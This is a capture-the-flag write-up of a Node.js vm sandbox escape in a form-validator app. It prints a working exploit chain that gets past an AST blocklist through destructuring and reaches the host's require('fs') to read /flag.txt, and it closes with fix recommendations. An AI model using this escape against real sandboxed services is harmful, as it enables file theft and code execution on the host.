# FormCraft — VM Sandbox Escape Writeup

## Summary

FormCraft lets users define custom "validator" expressions that are
statically checked with an AST blocklist (via `acorn`/`acorn-walk`) and then
executed inside a Node.js `vm.createContext` sandbox. The AST checker
blocks dangerous *identifiers* (`process`, `require`, `fs`, ...) and
*literal* member-property accesses (`.constructor`, `.prototype`,
`.process`, `.require`, ...), but it never inspects **destructuring
patterns**. Pulling a blocked property out via
`var { propName: alias } = obj;` never appears as a `MemberExpression`
or a matching `Identifier` node, so it sails through unnoticed.

Combined with the fact that `RegExp`, `Date`, `Math`, `JSON`, etc. are
passed into the sandbox **by direct reference to the real host
objects** (not re-created inside the vm), walking
`Object.getPrototypeOf(RegExp)` reaches the *real* `Function.prototype`
from the outer Node realm — not the sandbox's own. Destructuring
`constructor` off of that gives a live reference to the host `Function`
constructor, and `Function('return this')()` returns the actual
Node.js global object, complete with `process`, `require`, `Buffer`,
etc. From there it's a normal `fs.readFileSync` to read `/flag.txt`.

## Root causes

1. **AST blocklist only matches `MemberExpression`/`Identifier` nodes.**
   `ObjectPattern` destructuring keys (`var { x: y } = obj`) are neither,
   so any blocked property name can be exfiltrated this way.
2. **Host objects passed into the vm context by reference.** `RegExp`,
   `Date`, `Math`, `JSON`, `Array`, `Object`, `String`, `Number`,
   `Boolean` are the literal outer-realm objects, not vm-contextified
   copies. Their prototype chains lead straight back to the host
   `Function.prototype`, defeating the vm's realm isolation.
3. **String-literal identifier check is exact-match.** Building the
   string `'fs'` as `'f' + 's'` (or any other non-literal expression)
   bypasses the `FORBIDDEN_IDENTIFIERS` check, since it only fires on
   a literal `Identifier` node named `fs`.

## Exploit chain (single request, no persisted state needed)

```js
var fp = Object.getPrototypeOf(RegExp);      // real host Function.prototype
var { constructor: F } = fp;                  // destructure around the
                                               // ".constructor" blocklist
var g = F('return this')();                   // real Node global object
var { process: p } = g;                       // destructure around ".process"
var { mainModule: m } = p;                    // destructure around ".mainModule"
var { require: r } = m;                       // destructure around ".require"
var filesystem = r('f' + 's');                // 'fs' built at runtime, not
                                               // a literal Identifier
var { readFileSync: rfs } = filesystem;       // destructure around
                                               // ".readFileSync"
return rfs('/flag.txt', 'utf8');
```

## Reproduction steps

1. `POST /api/validator` with the above `rule` as an `"expression"`-type
   validator. It passes the strict (creation-time) AST check because it
   contains no forbidden identifiers, no forbidden literal member
   accesses, and no non-literal *computed* member access (which strict
   mode does block — this is why destructuring, not `obj[varName]`, is
   the bypass).
2. `POST /api/validator/<name>/test` with any `value`. The `result`
   field of the response contains the flag.

**Note on infrastructure:** the target sits behind an ALB fronting
multiple backend replicas with independent in-memory state, but ALB
sticky sessions (`AWSALB` cookie) keep a `curl` session pinned to one
pod as long as the cookie jar is reused across requests. Since the
whole exploit chain runs inside one `/test` call anyway, cross-request
state isn't actually required — but session pinning matters if you
want to `POST /api/validator` then `POST .../test` as two separate
requests.

## Fix recommendations

- Extend the AST walker to also inspect `Property` keys inside
  `ObjectPattern` (destructuring) and `AssignmentPattern` defaults,
  using the same `FORBIDDEN_PROPS`/`FORBIDDEN_IDENTIFIERS` sets.
- Don't pass host intrinsics (`RegExp`, `Date`, `Math`, `JSON`, `Array`,
  `Object`, `String`, `Number`, `Boolean`) into the vm context by
  reference. Either omit them, or use `vm.createContext()`'s own
  contextified globals (they're created automatically inside the
  context if you don't explicitly stub them from outside).
- Block dynamic string construction feeding into `require`-like calls
  is hard to fully prevent via AST alone; the real fix is #2 — if the
  vm never has a route back to the host's `Function`, `require` and
  `fs` are unreachable regardless of identifier obfuscation.
- Consider freezing/removing `constructor` accessibility entirely on
  every object surfaced to the sandbox, or running validators in a
  separate OS process/worker with no filesystem access instead of
  relying on `vm` for isolation (V8's `vm` module was never designed
  to be a hard security boundary against a determined attacker).
